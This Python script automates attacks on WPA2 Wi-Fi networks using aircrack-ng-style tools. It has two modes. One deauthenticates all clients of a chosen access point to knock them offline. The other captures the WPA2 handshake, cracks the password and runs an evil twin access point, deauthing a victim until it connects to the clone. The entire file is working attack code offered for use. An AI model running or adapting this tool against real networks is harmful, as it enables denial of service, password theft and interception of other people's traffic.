#!/usr/bin/env python3
"""
Automate an attack on devices connected to an AP using WPA2
"""

__version__ = "0.1.0"


from enum import Enum
import concurrent.futures
import time
import logging
from types import NoneType

import paircrack # Not using pyrcrack because of little documentation
import argparse
import yaml




class AttackType(Enum):
    AP_DOS = 1
    EVIL_TWIN = 2

LOGGER = logging.getLogger('Attacker')
    
class WPA2Attacker():
    def __init__(self, loglevel=0) -> NoneType:
        """Initializes required classes from paircrack package

        Parameters
        ----------
        loglevel : int, optional
            Verbosity level, by default 0
        """        
        self.airmon = paircrack.Airmon(loglevel)
        self.airodump = paircrack.Airodump(loglevel)
        self.aireplay = paircrack.Aireplay(loglevel)
        self.aircrack = paircrack.Aircrack(loglevel)
        self.hostetd = paircrack.Hostetd(loglevel)
    
    def automate_attack(self, attacktype : AttackType, ap_query : str):
        """Automtates an attack on a specified AP

        Either perform denial of service on selected AP by transmitting deauth packets
        or attempt to make client connect to evil twin AP.

        Parameters
        ----------
        attacktype : AttackType
            Type of attack to perform
        ap_query : str
            Either BSSID or ESSID of AP to target
        """        
 

        LOGGER.info(f'Running automated WPA2 attack: {attacktype.name}')

        with self.airmon as mon:
            ap_data = self._capture_ap(mon, ap_query)

        if ap_data is None:
            LOGGER.info('Target AP not found. Exiting...')
            return False
        else:
            LOGGER.info('Target AP found!')
            ap_bssid, ap_name, ap_channel = ap_data
            self.airmon.channel = ap_channel
        

        with self.airmon as mon:
            client_bssids, hs_fp = self._capture_clients(mon, ap_bssid)

            if not client_bssids:
                LOGGER.info(f'No connected clients found. Exiting...')
                return False
            else:
                LOGGER.info(f'{len(client_bssids)} connected clients found!')
                # check if hs in hs_fp
        
            if attacktype == AttackType.AP_DOS:
                self._attack_dos(mon, ap_bssid, client_bssids)


            elif attacktype == AttackType.EVIL_TWIN:
                client_bssid = client_bssids[0]
                
                while not self.aircrack.check_handshake(ap_bssid, hs_fp):
                    client_fp, hs_fp = self._capture_handshake(mon, ap_bssid, client_bssid)

                LOGGER.info('Handshake captured!')
                
                password = self._crack_wpa2key(ap_bssid, hs_fp)
                
                if password is None:
                    LOGGER.info(f'Password not cracked. Exiting...')
                    return False
                else:
                    LOGGER.info(f'Password cracked: <{password}>')
                    
                et_if = self.airmon.id_interfaces()[1]
                self.hostetd.create_conf(et_if, ap_name, ap_channel, password)
                
                with self.hostetd as etd:
                    max_attempts = 10
                    for a in range(max_attempts):
                        LOGGER.info(f'Deauthenticating client to force reconnection. Attempt {a+1}/{max_attempts}...')
                        self.aireplay.deauth(mon.interface, ap_bssid, client_bssid)
                        time.sleep(6)
                        if etd.is_client_connected(client_bssid):
                            LOGGER.info('Client takekover success!')
                            break
                    
                    time.sleep(30)
                    return True
                

    def evil_twin_from_pw(self, et_interface : str, ap_bssid : str, ap_name : str, ap_channel : str, password: str, client_bssid: str):
        """Runs Evil Twin attack when data is pre-known, including pw

        Parameters
        ----------
        et_interface : str
            Interface to run AP from
        ap_bssid : str
            BSSID of target AP
        ap_name : str
            ESSID of target network
        ap_channel : str
            Channel of target network
        password : str
            WPA2 password
        client_bssid : str
            BSSID of client, used for deauthication
        """        
        self.airmon.channel = ap_channel
        with self.airmon as mon:
            self.hostetd.create_conf(et_interface, ap_name, ap_channel, password)
            
            with self.hostetd as etd:
                while not etd.is_client_connected(client_bssid):
                    self.aireplay.deauth(mon.interface, ap_bssid, client_bssid)
                    time.sleep(10)

                LOGGER.info('Client takekover success!')
                time.sleep(60)
            

    def _capture_ap(self, mon : paircrack.Airmon, ap_query : str) -> tuple | NoneType:
        """Captures APs and searches for target AP

        Parameters
        ----------
        mon : Airmon
            Object running the monitoring interface
        ap_query : str
            ESSID or BSSID of targe AP

        Returns
        -------
        tuple | NoneType
            Tuple of AP data (BSSID, ESSID, Channel) if found.
            Otherwise None
        """        
        for timer in range(2,11,4):
            LOGGER.info(f'Searching for target AP for {timer} seconds...')
            aps_file = self.airodump.capture_aps(mon.interface, proc_timeout=timer)
            ap_data = self._get_ap_from_capture(ap_query, aps_file)
            if ap_data is not None: break
                
        return ap_data


    def _capture_clients(self, mon : paircrack.Airmon, ap_bssid : str) -> tuple:
        """Captures clients and potential handshakes

        Parameters
        ----------
        mon : paircrack.Airmon
            Object running the monitoring interface
        ap_bssid : str
            BSSID of target AP

        Returns
        -------
        tuple
            First element is list of client BSSIDs and second is 
            handshake filepath 
        """        
        for timer in range(10,21,5):
            LOGGER.info(f'Capturing connected clients for {timer} seconds...')
            client_fp, hs_fp = self.airodump.capture_clients(mon.interface, 
                                                            ap_bssid, mon.channel, proc_timeout=timer)
            client_bssids = self.airodump.parse_clients_netxml(client_fp, ap_bssid)
            if client_bssids: break
                
        return client_bssids, hs_fp


    def _attack_dos(self, mon : paircrack.Airmon, ap_bssid : str, client_bssids : list, seconds=45) -> NoneType:
        """Performs the DoS attack using deauthentication frames

        Parameters
        ----------
        mon : paircrack.Airmon
            Object running the monitoring interface
        ap_bssid : str
            BSSID of target AP
        client_bssids : list
            Target list of client str BSSIDs to target
        seconds : int, optional
            Length of DoS attack in seconds, by default 45
        """        
        start = time.time()
        end = start
        while end - start < seconds:
            for cb in client_bssids:
                LOGGER.info(f'DoS-ing {cb}')
                self.aireplay.deauth(mon.interface, ap_bssid, cb)
                end = time.time()
        return


    def _capture_handshake(self, mon : paircrack.Airmon, ap_bssid : str, client_bssid : str) -> tuple:
        """Deauthenticates client and captures handshake upon reconnect

        Parameters
        ----------
        mon : paircrack.Airmon
            Object running the monitoring interface
        ap_bssid : str
            BSSID of target AP
        client_bssids : list
            Target list of client str BSSIDs to target
        client_bssid : str
            BSSID of target client

        Returns
        -------
        tuple
            First element is filepath to client xml capture, second is 
            filepath to hanshake capture file
        """        
        LOGGER.info('Attempting to capture WPA2 handshake')
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            fut_dump = executor.submit(self.airodump.capture_clients, 
                                        mon.interface, ap_bssid, 
                                        mon.channel, proc_timeout=20)
            fut_deauth = executor.submit(self.aireplay.deauth, 
                                            mon.interface, ap_bssid, client_bssid)

            client_fp, hs_fp = fut_dump.result()
        return client_fp, hs_fp


    def _crack_wpa2key(self, ap_bssid : str, hs_fp : str) -> str:
        """Crack password of target AP from handshake file

        Parameters
        ----------
        ap_bssid : str
            BSSID of target AP
        hs_fp : str
            Filepath to handshake capture file

        Returns
        -------
        str
            Password if found. None if not found.
        """        
        LOGGER.info(f'Attempting to crack password...')
        result = self.aircrack.crack_wpa2(ap_bssid, hs_fp)
        return result

        
    def _get_ap_from_capture(self, ap_query, aps_file):
        aps = self.airodump.parse_aps_netxml(aps_file)
        for ap in aps:
            if ap[1] is not None:
                if ap_query in ap[0] or ap_query in ap[1]:
                    return ap
        
        return None  # ap not among captured aps
            


def main(args):
    

    if args.verbose == 0:
        LOGGER.setLevel(logging.INFO)
    if args.verbose >= 1:
        LOGGER.setLevel(logging.DEBUG)

 
    with open(args.infile) as ymlfile:
        params = yaml.load(ymlfile, Loader=yaml.loader.SafeLoader)
    
    
    attacker = WPA2Attacker(args.verbose)
    attacker.automate_attack(AttackType(params['attack_type']), params['ap_ssid'].upper())


if __name__ == "__main__":
    """ This is executed when run from the command line """
    parser = argparse.ArgumentParser(description="Automate attacks on WPA2 PSK-CCMP")

    # Filepath to YAML file
    parser.add_argument("infile",
        help="YAML file containing parameters")

    # Optional verbosity counter (eg. -v, -vv, -vvv, etc.)
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Verbosity (-v or -vv)")

    # Specify output of "--version"
    parser.add_argument(
        "--version",
        action="version",
        version="%(prog)s (version {version})".format(version=__version__))

    args = parser.parse_args()
    main(args)